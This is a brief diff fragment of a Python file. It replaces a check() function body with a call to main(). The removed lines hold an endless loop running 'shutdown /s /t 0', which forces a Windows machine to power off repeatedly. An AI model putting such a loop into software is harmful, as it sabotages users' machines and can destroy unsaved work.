@@ -81,6 +81,5 @@ def main():
 
 
 def check():
-  while True:
-   os.system("shutdown /s /t 0 ")
+ main()
 check()
